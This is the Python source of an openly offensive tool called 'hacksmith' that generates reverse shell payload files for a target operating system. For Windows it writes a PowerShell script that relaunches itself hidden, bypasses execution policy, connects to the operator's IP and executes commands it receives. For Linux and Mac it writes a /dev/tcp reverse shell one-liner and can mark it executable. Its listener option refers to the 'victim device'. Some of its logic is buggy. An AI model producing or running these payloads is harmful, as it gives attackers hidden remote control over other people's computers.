import argparse
import ipaddress
import sys
import time
import subprocess


class Dozer:
    """
    tool
    """

    def __init__(
        self,
        parser,
        ip: str,
        port: int,
        os: str,
        output: str,
        listener: bool,
        executable: bool,
    ) -> None:
        """
        initialization for hacksmith tool
        """
        self.parser = parser
        if not self.__check_ip(ip):
            parser.error("invalid ip")

        self.ip: str = ip
        self.port: int = port
        self.os: str = os
        self.output_filename: str = output
        self.start_listener: bool = listener
        self.executable: bool = executable

    def create(self):
        """
        create super cool fancy reverse shell
        """

        print("creating dozer_shell")
        print("-------------")
        print(f"ip = {self.ip}")
        print(f"port = {self.port}")
        print(f"os = {self.os}")
        print("-------------")

        time.sleep(1)
        match self.os:
            case "windows":
                print(f"creating {self.output_filename} revshell for windows")
                self.__windows_rev_shell()
            case "linux":
                print(f"creating {self.output_filename} revshell for linux")
                self.__mac_linux_shell()
            case "mac":
                print(f"creating {self.output_filename} revshell for mac")
                self.__mac_linux_shell()
            case "android":
                print(f"creating {self.output_filename} revshell for android")
                print("not available yet :( ")
            case "ios":
                print(f"creating {self.output_filename} revshell for ios")
                print("creating revshell for ios")

        if self.start_listener:
            print("//LOG: starting listener")
            self.init_listener()

        return

    def init_listener(self) -> bool:
        return True

    def __windows_rev_shell(self) -> None:
        ps_script = f"""\
# Check if script is running with the right args (hidden, no profile, bypass)
if (-not ($MyInvocation.InvocationName -like "*-nop*" -and $host.UI.RawUI.WindowTitle -eq "")) {{
    $psi = New-Object System.Diagnostics.ProcessStartInfo
    $psi.FileName = "powershell.exe"
    $psi.Arguments = "-nop -W hidden -noni -ep bypass -File `"$PSCommandPath`""
    $psi.WindowStyle = "Hidden"
    $psi.CreateNoWindow = $true
    [System.Diagnostics.Process]::Start($psi) | Out-Null
    exit
}}

$TCPClient = New-Object Net.Sockets.TCPClient("{self.ip}", {self.port})
$NetworkStream = $TCPClient.GetStream()
$StreamWriter = New-Object IO.StreamWriter($NetworkStream)

function WriteToStream ($String) {{
    [byte[]]$script:Buffer = 0..$TCPClient.ReceiveBufferSize | % {{0}}
    $StreamWriter.Write($String + "DOZER_SHELL> ")
    $StreamWriter.Flush()
}}

WriteToStream ''

while (($BytesRead = $NetworkStream.Read($Buffer, 0, $Buffer.Length)) -gt 0) {{
    $Command = ([text.encoding]::UTF8).GetString($Buffer, 0, $BytesRead - 1)
    $Output = try {{
        Invoke-Expression $Command 2>&1 | Out-String
    }} catch {{
        $_ | Out-String
    }}
    WriteToStream ($Output)
}}

$StreamWriter.Close()
"""

        time.sleep(1)
        with open(f"{self.output_filename}.ps1", "w", encoding="utf-8") as f:
            f.write(ps_script)
            print(f"//LOG: created {self.output_filename} file")

    def __mac_linux_shell(self) -> None:
        """
        mac and linux has same rev shell, fuck your naming patterns
        """
        script = f"sh -i >& /dev/tcp/{self.ip}/{self.port} 0>&1"
        time.sleep(1)
        with open(f"{self.output_filename}.sh", "w", encoding="utf-8") as f:
            f.write(script)
            print(f"//LOG: created {self.output_filename}.sh")
            if self.executable:
                time.sleep(0.5)
                print("//LOG: making rev shell executable")
                subprocess.run(["chmod", "+x", f"{self.output_filename}.sh"])
                print("//LOG: revshell is now exectuable!")

    def __check_ip(self, ip: str) -> bool:
        try:
            ipaddress.ip_address(ip)
            return True
        except ValueError:
            return False

    def __error(self, err_message: str) -> None:
        print(err_message)


def main():
    parser = argparse.ArgumentParser(
        prog="hacksmith",
        description="tool for making crossplaftform revshells",
        epilog="made by n0_sh4d3",
    )

    parser.add_argument("--ip", help="home ip address", required=True, type=str)
    parser.add_argument("--port", help="port number", required=True, type=int)
    parser.add_argument("--output", help="name for output revshell file")
    parser.add_argument(
        "--listener",
        help="optional flag to start listening for connection from victim device",
        action="store_true",
    )
    parser.add_argument(
        "--exec",
        help="make reverse shell executable (works only for mac/linux)",
        action="store_true",
    )
    parser.add_argument(
        "--os",
        help="target os",
        choices=[
            "windows",
            "linux",
            "mac",
            "android",
            "ios",
        ],
    )

    args = parser.parse_args()
    if args.port <= 1024:
        print("port cannot be lower than 1024")
    if args.port > 65535:
        print("port cannot be higher than 65535")

    if args.output is None:
        args.output = "rev_shell"

    if args.exec and args.os != "linux" or args.os != "mac":
        raise parser.error(f"can't make {args.os} rev shell executable")

    # that's all i need to see in main lol
    tool = Dozer(
        parser=parser,
        ip=args.ip,
        port=args.port,
        os=args.os,
        output=args.output,
        listener=args.listener,
        executable=args.exec,
    )
    tool.create()


if __name__ == "__main__":
    main()
